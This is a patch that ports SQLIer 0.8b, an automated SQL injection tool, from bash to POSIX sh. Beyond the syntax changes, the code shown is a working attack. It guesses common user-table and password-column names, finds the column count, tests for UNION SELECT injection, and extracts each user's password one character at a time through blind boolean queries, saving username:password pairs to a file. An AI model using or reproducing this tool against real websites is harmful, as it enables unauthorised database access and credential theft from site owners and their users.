@@ -1,0 +1,247 @@
+--- sqlier.sh	2009-04-15 12:06:51.613456809 +0300
++++ /usr/bin/sqlier	2009-04-15 12:04:59.420142504 +0300
+@@ -1,4 +1,4 @@
+-#!/bin/bash
++#!/bin/sh
+ 
+ #
+ # SQLIer - Version 0.8b
+@@ -13,10 +13,11 @@
+ tblnms="users,user,members,phpbb_users,vb3_user,ibf_members,bbusers,bbuser,usrs,usr,accounts,account,accnts,accnt,customers,customer"
+ unflds="username,name,user,user_name,user_username,uname,user_uname,usern,user_usern,un,user_un,usrnm,user_usrnm,usr,usernm,user_usernm,nm,user_nm"
+ pwflds="password,user_password,pass_hash,hash,pass,user_pass,pword,user_pword,passwd,user_passwd,passw,user_passw,pwrd,user_pwrd,pwd,user_pwd"
++stdout="/proc/self/fd/1"
+ 
+ # Options Stuff
+ sleeptime=0
+-function strip_url(){ echo "$1" | sed -r "s/^([^\?\&\#]*).*?/\1/g"; }
++strip_url(){ echo "$1" | sed -r "s/^([^\?\&\#]*).*?/\1/g"; }
+ while [ ! -z "$1" ]; do
+ 	case "$1" in
+ 		-c) shift; clearhost="$1"; url=1; break ;;
+@@ -62,8 +63,8 @@
+ 	exit
+ fi
+ 
+-function clear_host(){
+-	temp="`tempfile`"
++clear_host(){
++	temp=`mktemp`
+ 	cat $HOME/.sqlier/exploits | grep -vE "^$1	" > $temp
+ 	rm $HOME/.sqlier/exploits
+ 	mv $temp $HOME/.sqlier/exploits
+@@ -77,14 +78,14 @@
+ fi
+ 
+ # FUNCTIONS #
+-function reqcnt(){
++reqcnt(){
+ 	req="`cat $reqfile`"
+-	let req+=1
++	req=$((req+1))
+ 	echo "$req" > $reqfile
+ }
+ 
+ # save to ~/.sqlier/exploits
+-function save(){
++save(){
+ 	[ ! -d "$HOME/.sqlier" ] && mkdir "$HOME/.sqlier"
+ 	status_str="`get_status`"
+ 	[ -e "$HOME/.sqlier/exploits" ] && clear_host $host
+@@ -92,7 +93,7 @@
+ 	echo "Saved information to ~/.sqlier/exploits"
+ }
+ 
+-function quit(){
++quit(){
+ 	reqs="`cat $reqfile`"
+ 	rm $reqfile
+ 	[ -z "$1" ] && save
+@@ -101,15 +102,21 @@
+ }
+ 
+ # one liners
+-function addslashes(){ echo "$1" | sed -r "s/\"/\\\\\"/g"; }
+-function chr(){ echo "print chr($max)" | python; }
+-function ord(){ echo -n $1 | od -d | sed -r "s/[ ]+/ /g" | awk "{print \$2}" | grep -v "^$"; }
+-function b64e(){ str="`addslashes "$1"`"; echo -e "import base64\nprint base64.encodestring(\"\"\"$str\"\"\")" | python | sed -r "s/[\n ]//g"; }
+-function b64d(){ str="`addslashes "$1"`"; echo -e "import base64\nprint base64.decodestring(\"\"\"$str\"\"\")" | python; }
++addslashes(){ echo "$1" | sed -r "s/\"/\\\\\"/g"; }
++chr(){ echo "print chr($max)" | python; }
++ord(){ echo -n $1 | od -d | sed -r "s/[ ]+/ /g" | awk "{print \$2}" | grep -v "^$"; }
++b64e(){ str=`addslashes "$1"`; echo -e "import base64\nprint base64.encodestring(\"\"\"$str\"\"\")" | python | sed -r "s/[\n ]//g"; }
++b64d(){ str=`addslashes "$1"`; echo -e "import base64\nprint base64.decodestring(\"\"\"$str\"\"\")" | python; }
++# return n chars from right
++right() { awk -vs="$1" -vn="$2" 'BEGIN{l = length(s); i = 1 + l - n; print substr(s, i, n); exit}'; }
++# trim n chars from right
++rtrim() { awk -vs="$1" -vn="$2" 'BEGIN{l = length(s); i = l - n; print substr(s, 1, i); exit}'; }
++# return char at position n
++charat() { awk -vs="$1" -vn="$2" 'BEGIN{print substr(s, n, 1); exit}'; }
+ 
+-function get_status(){ enc="`b64e "$commstr:$fieldcnt:$tblnm:$unfld:$pwfld:$wgetopts"`"; echo $enc; }
++get_status(){ enc="`b64e "$commstr:$fieldcnt:$tblnm:$unfld:$pwfld:$wgetopts"`"; echo $enc; }
+ 
+-function sqli(){
++sqli(){
+ 	[ ! -z "$sleeptime" ] && [ -z "$2" ] && sleep $sleeptime
+ 	newurl="`echo "$url$1" | sed "s/ /%20/g"`"
+ 	newurl="`addslashes "$newurl"`"
+@@ -118,19 +125,19 @@
+ 	reqcnt
+ }
+ 
+-function sameperc(){
+-	file1="`tempfile`"
+-	file2="`tempfile`"
++sameperc(){
++	file1=`mktemp`
++	file2=`mktemp`
+ 	echo "$1" > $file1
+ 	echo "$2" > $file2
+ 	tot="`cat "$file1" "$file2" | wc -c`"
+ 	diffmnt="`diff "$file1" "$file2" | grep "^[<>]" | sed -r "s/^..(.*)$/\1/g" | wc -c`"
+ 	rm "$file1" "$file2"
+-	let "sameperc=(($tot-$diffmnt)*100)/$tot"
++	sameperc=$(((($tot-$diffmnt)*100)/$tot))
+ 	echo $sameperc
+ }
+ 
+-function proximity(){
++proximity(){
+ 	comp1="`sameperc "$1" "$success"`"
+ 	comp2="`sameperc "$1" "$null"`"
+ 	comp3="`sameperc "$1" "$fail"`"
+@@ -141,29 +148,29 @@
+ 	else [ "$comp1" -ge "$comp2" ] && echo 1; fi
+ }
+ 
+-function spaceit(){
++spaceit(){
+ 	spaces=""
+-	i=0; while let i+=1 && [ "$i" -le "$1" ]; do spaces+=" "; done
++	i=0; while i=$((i+1)) && [ "$i" -le "$1" ]; do spaces="$spaces "; done
+ }
+ 
+-function loop_fields(){
++loop_fields(){
+ 	loflds="$1"
+ 	dotbl="$2"
+ 	lofld=""
+ 	prev=0
+-	i=0; while let i+=1 && [ ! -z "`echo "$loflds" | cut -d ',' -f$i`" ]; do
++	i=0; while i=$((i+1)) && [ ! -z "`echo "$loflds" | cut -d ',' -f$i`" ]; do
+ 		lo="`echo "$loflds" | cut -d ',' -f$i`"
+ 		[ -z "$dotbl" ] && usel="`sqli " limit 0 union select $lo$fieldstrn from $tblnm limit 1$comstr"`"\
+ 		|| usel="`sqli " limit 0 union select $fieldstr from $lo limit 1$comstr"`"
+ 		[ "`proximity "$usel"`" ] && lofld="$lo" && break
+-		let prev=${#lo}
++		prev=${#lo}
+ 		[ "$lo" = "$loflds" ] && break
+ 	done
+ 	echo "$lofld"
+ }
+ # END FUNCTIONS #
+ 
+-reqfile="`tempfile`"
++reqfile=`mktemp`
+ echo 0 > $reqfile
+ 
+ if [ -e "$HOME/.sqlier/exploits" ]; then
+@@ -215,20 +222,20 @@
+ 
+ 	# fieldcnt
+ 	max=0; min=1; while [ "`proximity "$maxord"`" ] || [ "$max" = "0" ]; do
+-		let max+=10
++		max=$((max+10))
+ 		maxord="`sqli " order by $max limit 1$comstr"`"
+ 	done
+ 
+-	while let c=$max-1 && [ "$c" != "$min" ]; do
+-		let check=($min+$max)/2
++	while c=$(($max-1)) && [ "$c" != "$min" ]; do
++		check=$((($min+$max)/2))
+ 		chk="`sqli " order by $check limit 1$comstr"`"
+ 		[ "`proximity "$chk"`" ] && min="$check" || max="$check"
+ 	done
+ 
+ 	fieldcnt="$min"
+ fi
+-fieldstr="1"; i=2; while [ "$i" -le "$fieldcnt" ]; do fieldstr+=",$i"; let i+=1; done
+-fieldstrn=""; i=2; while [ "$i" -le "$fieldcnt" ]; do fieldstrn+=",$i"; let i+=1; done
++fieldstr="1"; i=2; while [ "$i" -le "$fieldcnt" ]; do fieldstr="$fieldstr,$i"; i=$((i+1)); done
++fieldstrn=""; i=2; while [ "$i" -le "$fieldcnt" ]; do fieldstrn="$fieldstrn,$i"; i=$((i+1)); done
+ echo " \"$fieldcnt\""
+ 
+ echo -n "determining if UNION SELECT vulnerable..."
+@@ -244,7 +251,7 @@
+ 
+ if [ ! -z "$tblnm" ]; then
+ 
+-	if [ "${tblnm:${#tblnm}-7:7}" = "members" ]; then
++	if [ "$(right "$tblnm")" = "members" ]; then
+ 		usel="`sqli " limit 0 union select $fieldstr from ${tblnm}_converge limit 1$comstr"`"
+ 		if [ "`proximity "$usel"`" ]; then
+ 			ibf=1
+@@ -267,9 +274,9 @@
+ 	echo
+ 	echo -n "Not enough information to complete exploit... need "
+ 	[ -z "$tblnm" ] && need="table name, "
+-	[ -z "$unfld" ] && need+="username field, "
+-	[ -z "$pwfld" ] && need+="password field, "
+-	echo "${need:0:${#need}-2}"
++	[ -z "$unfld" ] && need="${need}username field, "
++	[ -z "$pwfld" ] && need="${need}password field, "
++	rtrim "$need" 2
+ 	quit 1
+ fi
+ echo
+@@ -281,14 +288,14 @@
+ echo
+ echo
+ 
+-k=0; while let k+=1 && username="`echo "$usernames" | cut -d ',' -f$k`" && [ ! -z "$username" ]; do
++k=0; while k=$((k+1)) && username="`echo "$usernames" | cut -d ',' -f$k`" && [ ! -z "$username" ]; do
+ 	i=1
+ 	userstr="concat("
+ 	while [ "$i" -le "${#username}" ]; do
+-		userstr+="char("`ord ${username:$i-1:1}`"),"
+-		let i+=1
++		userstr="${userstr}char("`ord $(charat "$username" $i)`"),"
++		i=$((i+1))
+ 	done
+-	userstr="${userstr:0:${#userstr}-1})"
++	userstr="$(rtrim "$userstr" 1))"
+ 
+ 	if [ "$k" = "1" ]; then
+ 		fail="$bfail"
+@@ -296,7 +303,7 @@
+ 		null="`sqli " limit 0 union select $fieldstr from $tblnm limit 0$comstr"`"
+ 	fi
+ 
+-	function inject(){
++	inject(){
+ 		passstr="ord(substring($pwfld,$1,1))>$2"
+ 		[ -z "$ibf" ] && usel="`sqli " limit 0 union select $fieldstr from $tblnm where $unfld=$userstr and $passstr limit 1$comstr"`"\
+ 		|| usel="`sqli " limit 0 union select $fieldstr from $tblnm, ${tblnm}_converge where $unfld=$userstr and id=converge_id and $passstr limit 1$comstr"`"
+@@ -309,16 +316,16 @@
+ 	while [ ! -z "`inject $charno 0`" ]; do
+ 		min=0
+ 		max=128
+-		while let c=$max-1 && [ "$c" != "$min" ]; do
+-			let check=($max+$min)/2
++		while c=$(($max-1)) && [ "$c" != "$min" ]; do
++			check=$((($max+$min)/2))
+ 			[ ! -z "`inject $charno $check`" ] && min="$check" || max="$check"
+ 		done
+ 		chr="`chr $max`"
+ 		echo -n $chr
+-		wholepass+="$chr"
+-		let charno+=1
++		wholepass="$wholepass$chr"
++		charno=$((charno+1))
+ 	done
+-	let passlen=$charno-1
++	passlen=$(($charno-1))
+ 	echo
+ 
+ 	[ ! -z "$outputfile" ] && echo "$username:$wholepass" >> $outputfile
